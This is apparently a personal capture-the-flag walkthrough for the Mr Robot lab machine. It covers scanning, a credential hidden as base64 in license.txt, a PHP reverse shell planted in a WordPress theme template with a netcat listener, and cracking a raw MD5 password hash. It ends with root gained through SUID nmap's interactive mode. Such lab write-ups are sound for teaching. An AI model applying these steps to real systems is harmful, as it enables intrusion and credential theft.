@@ -1,0 +1,340 @@
+Mr Robot CTF
+time taken : ~ 4 hours
+
+ok so robots.txt:
+
+robots.txt:
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+foscity.dic is a dicitonary. so maybe bruteforcing will actually work this time (didn't end up using it)
+
+nmap:
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-26 21:22 MDT
+Nmap scan report for ctf03.root-me.org (212.129.29.185)
+Host is up (0.13s latency).
+Not shown: 997 filtered ports
+PORT    STATE SERVICE VERSION
+22/tcp  open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http    Apache httpd
+443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: bridge|general purpose
+Running (JUST GUESSING): Oracle Virtualbox (98%), QEMU (95%)
+OS CPE: cpe:/o:oracle:virtualbox cpe:/a:qemu:qemu
+Aggressive OS guesses: Oracle Virtualbox (98%), QEMU user mode network gateway (95%)
+No exact OS matches for host (test conditions non-ideal).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 45.78 seconds
+
+
+
+uniscan:
+
+####################################
+# Uniscan project                  #
+# http://uniscan.sourceforge.net/  #
+####################################
+V. 6.3
+
+
+Scan date: 26-5-2017 21:25:30
+===================================================================================================
+| Domain: http://ctf03.root-me.org/
+| Server: Apache
+| IP: 212.129.29.185
+===================================================================================================
+|
+| Directory check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org/Image/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/admin/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/feed/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/image/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/login/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/rss/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/wp-login/
+| [+] CODE: 200 URL: http://ctf03.root-me.org/wp-admin/
+===================================================================================================
+|                                                                                                   
+| File check:
+| [+] CODE: 200 URL: http://ctf03.root-me.org/admin/index.html
+| [+] CODE: 200 URL: http://ctf03.root-me.org/admin/index.php
+| [+] CODE: 200 URL: http://ctf03.root-me.org/favicon.ico
+| [+] CODE: 200 URL: http://ctf03.root-me.org/index.html
+| [+] CODE: 200 URL: http://ctf03.root-me.org/index.html%20
+| [+] CODE: 200 URL: http://ctf03.root-me.org/index.php
+| [+] CODE: 200 URL: http://ctf03.root-me.org/license.txt
+| [+] CODE: 200 URL: http://ctf03.root-me.org/readme
+| [+] CODE: 200 URL: http://ctf03.root-me.org/readme.html
+| [+] CODE: 200 URL: http://ctf03.root-me.org/robots.txt
+| [+] CODE: 200 URL: http://ctf03.root-me.org/search/htx/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf03.root-me.org/search/sqlqhit.asp
+| [+] CODE: 200 URL: http://ctf03.root-me.org/search/htx/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf03.root-me.org/search/SQLQHit.asp
+| [+] CODE: 200 URL: http://ctf03.root-me.org/sitemap.xml
+===================================================================================================
+|
+| Check robots.txt:
+|
+| Check sitemap.xml:
+===================================================================================================
+|
+| Crawler Started:
+| Plugin name: Upload Form Detect v.1.1 Loaded.
+| Plugin name: Code Disclosure v.1.1 Loaded.
+| Plugin name: FCKeditor upload test v.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: phpinfo() Disclosure v.1 Loaded.
+| Plugin name: External Host Detect v.1.2 Loaded.
+| Plugin name: Web Backdoor Disclosure v.1.1 Loaded.
+| Plugin name: E-mail Detection v.1.1 Loaded.
+| [+] Crawling finished, 53 URL's found!
+|
+| File Upload Forms:
+|
+| Source Code Disclosure:
+|
+| FCKeditor File Upload:
+|
+| Timthumb:
+|
+| PHPinfo() Disclosure:
+|
+| External hosts:
+| [+] External Host Found: https://wordpress.org
+| [+] External Host Found: http://browsehappy.com
+| [+] External Host Found: http://gmpg.org
+|
+| Web Backdoors:
+|
+| E-mails:
+|
+| Ignored Files: 
+| http://ctf03.root-me.org/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1
+| http://ctf03.root-me.org/wp-includes/wlwmanifest.xml
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/js/keyboard-image-navigation.js?ver=20141010
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/genericons/genericons.css?ver=3.2
+| http://ctf03.root-me.org/wp-admin/css/login.min.css?ver=4.3.1
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/css/ie7.css?ver=20141010
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/js/functions.js?ver=20150330
+| http://ctf03.root-me.org/wp-includes/js/comment-reply.min.js?ver=4.3.1
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/css/ie.css?ver=20141010
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/style.css?ver=4.3.1
+| http://ctf03.root-me.org/wp-content/themes/twentyfifteen/js/skip-link-focus-fix.js?ver=20141010
+| http://ctf03.root-me.org/wp-includes/js/jquery/jquery.js?ver=1.11.3
+===================================================================================================
+| Dynamic tests:
+| Plugin name: Learning New Directories v.1.2 Loaded.
+| Plugin name: FCKedior tests v.1.1 Loaded.
+| Plugin name: Timthumb <= 1.32 vulnerability v.1 Loaded.
+| Plugin name: Find Backup Files v.1.2 Loaded.
+| Plugin name: Blind SQL-injection tests v.1.3 Loaded.
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: PHP CGI Argument Injection v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.2 Loaded.
+| Plugin name: SQL-injection tests v.1.2 Loaded.
+| Plugin name: Cross-Site Scripting tests v.1.2 Loaded.
+| Plugin name: Web Shell Finder v.1.3 Loaded.
+| [+] 1 New directories added
+|                                                                                                   
+|                                                                                                   
+| FCKeditor tests:
+|                                                                                                   
+|                                                                                                   
+| Timthumb < 1.33 vulnerability:
+|                                                                                                   
+|                                                                                                   
+| Backup Files:
+|                                                                                                   
+|                                                                                                   
+| Blind SQL Injection:
+|                                                                                                   
+|                                                                                                   
+| Local File Include:
+|                                                                                                   
+|                                                                                                   
+| PHP CGI Argument Injection:
+|                                                                                                   
+|                                                                                                   
+| Remote Command Execution:
+|                                                                                                   
+|                                                                                                   
+| Remote File Include:
+|                                                                                                   
+|                                                                                                   
+| SQL Injection:
+|                                                                                                   
+|                                                                                                   
+| Cross-Site Scripting (XSS):
+|                                                                                                   
+|                                                                                                   
+| Web Shell Finder:
+===================================================================================================
+| Static tests:
+| Plugin name: Local File Include tests v.1.1 Loaded.
+| Plugin name: Remote Command Execution tests v.1.1 Loaded.
+| Plugin name: Remote File Include tests v.1.1 Loaded.
+|                                                                                                   
+|                                                                                                   
+| Local File Include:
+|                                                                                                   
+|                                                                                                   
+| Remote Command Execution:
+|                                                                                                   
+|                                                                                                   
+| Remote File Include:
+===================================================================================================
+Scan end date: 26-5-2017 21:37:14
+HTML report saved in: report/ctf03.root-me.org.html
+
+http://ctf03.root-me.org/license.txt:
+
+some smart-ass comments, but at the bottom of the page...
+
+ZWxsaW90OkVSMjgtMDY1Mgo= --> base64 decode --> elliot:ER28-0652
+
+we found our WP login:
+
+http://ctf03.root-me.org/wp-login.php
+
+Welcome to WordPress 4.3.1
+
+alright this is admin account for WP
+same creds don't work for ssh unfortunately...
+
+changed password on account mich05654 to "password", nothing interesting there
+
+I HOPE YOU DON'T HAVE TO KNOW A BUNCH ABOUT THE SHOW?
+
+admin cookie: 7C33fcd5b7aabe0352f0bdbce805400e6150fef191ebb15f0dd75424c6c12f2890
+
+action=heartbeat in one of the requests upon reload?
+
+
+many metasploit modules later, no shell >:{
+
+need a different approach...
+
+FINALLY:
+ok so you got to upload php-reverse-shell to a certain template
+
+I picked twentyThirteen, 404-info.php
+
+replace the theme with your php-reverse-shell
+
+go to a page that probably does not exist:
+
+http://ctf03.root-me.org/feed/hello
+
+have a listener active:
+
+root@kdog:~/ctf_shit/mr_robot# nc -nvlp 4447
+listening on [any] 4447 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 42413
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 05:29:09 up  1:01,  0 users,  load average: 0.00, 0.01, 0.02
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+WHOA. a shell. this is a fun one
+
+$ cat home/robot/password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+john --wordlist=/media/sf_shared_VM/rockyou.txt hesh.txt --format=Raw-MD5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (robot)
+1g 0:00:00:00 DONE (2017-05-26 23:38) 3.125g/s 126262p/s 126262c/s 126262C/s abygail..TERRELL
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+
+TWO SHELLS??????? WHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+so it's robot:abcdefghijklmnopqrstuvwxyz for the second shell. ok...
+
+
+same key seems to be found in both daemon and robot
+$ cat key-2-of-3.txt 
+Congratz! You got the second key. Try to get the last one ;)
+
+how nice of them
+
+$ uname -r
+3.13.0-55-generic
+
+$ ./exp
+spawning threads
+rm: cannot remove ‘/tmp/ns_sploit’: Operation not permitted
+mount #1
+mount #2
+child threads done
+exploit failed
+
+fuuuuuuuckkkkk
+
+I did this with three different exploits, all failed as above. 
+
+there seems to be no difference in privs between these two shells.
+local privesc does not work on either....
+
+
+another way 3.13.0-55 can be exploited, accorind to https://www.exploit-db.com/papers/18168/, is this:
+had to look this one up, but still didn't exactly work. used the below commands to finally crack it:
+
+$ find / -perm -u=s -type f 2>/dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/passwd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+$/usr/local/bin/nmap –version
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2017-05-27 06:13 UTC
+Failed to resolve given hostname/IP: –version.  Note that you can't use '/mask' AND '[1-4,7,100-]' style IP ranges
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap finished: 0 IP addresses (0 hosts up) scanned in 0.112 seconds
+$  /usr/local/bin/nmap –interactive
+
+Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2017-05-27 06:14 UTC
+Failed to resolve given hostname/IP: –interactive.  Note that you can't use '/mask' AND '[1-4,7,100-]' style IP ranges
+WARNING: No targets were specified, so 0 hosts scanned.
+Nmap finished: 0 IP addresses (0 hosts up) scanned in 0.135 seconds
+*NOW WE HAVE NMAP AS LAST SUDO USER*
+$ !sh
+-su: !sh: event not found
+$  /usr/local/bin/nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+
+
+WOW. that was fucking hard. easily the best CTF I've done yet.
+
+
